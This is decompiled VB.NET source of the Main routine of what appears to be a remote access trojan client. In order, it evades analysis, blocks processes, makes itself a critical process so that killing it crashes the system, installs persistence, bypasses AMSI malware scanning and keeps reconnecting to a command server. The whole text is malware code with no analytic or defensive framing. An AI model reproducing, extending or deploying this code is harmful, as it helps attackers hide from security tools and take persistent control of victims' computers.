Imports System
Imports System.Threading
Imports Client.Connection
Imports Client.Helper
Imports Client.Install

Namespace Client
	' Token: 0x02000002 RID: 2
	Public Class Program
		' Token: 0x06000001 RID: 1 RVA: 0x000026FC File Offset: 0x000008FC
		Public Shared Sub Main()
			For i As Integer = 0 To Convert.ToInt32(Settings.De_lay) - 1
				Thread.Sleep(1000)
			Next
			If Not Settings.InitializeSettings() Then
				Environment.[Exit](0)
			End If
			Try
				If Convert.ToBoolean(Settings.An_ti) Then
					Anti_Analysis.RunAntiAnalysis()
				End If
				If Not MutexControl.CreateMutex() Then
					Environment.[Exit](0)
				End If
				If Convert.ToBoolean(Settings.Anti_Process) Then
					AntiProcess.StartBlock()
				End If
				If Convert.ToBoolean(Settings.BS_OD) AndAlso Methods.IsAdmin() Then
					ProcessCritical.[Set]()
				End If
				If Convert.ToBoolean(Settings.In_stall) Then
					NormalStartup.Install()
				End If
				Methods.PreventSleep()
				If Methods.IsAdmin() Then
					Methods.ClearSetting()
				End If
				Amsi.Bypass()
			Catch
			End Try
			While True
				Try
					If Not ClientSocket.IsConnected Then
						ClientSocket.Reconnect()
						ClientSocket.InitializeClient()
					End If
				Catch
				End Try
				Thread.Sleep(5000)
			End While
		End Sub
	End Class
End Namespace
